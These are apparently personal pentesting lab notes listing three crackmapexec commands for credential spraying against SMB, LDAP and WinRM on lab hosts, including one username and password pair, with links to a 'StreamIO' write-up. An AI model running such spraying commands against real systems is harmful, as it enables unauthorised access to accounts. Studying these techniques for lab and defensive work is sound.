#### SMB
```powershell
crackmapexec smb 10.10.11.158 -u users -p creds
```
Example:
[[StreamIO#^11d8df]]

#### LDAP
```powershell
crackmapexec ldap 10.10.11.158 -u users -p creds --continue-on-success
```
[[StreamIO#^676765]]

#### WINRM
```powershell
crackmapexec winrm 192.168.143.59 -u Allison -p 'RockYou!' -d offsec.local
```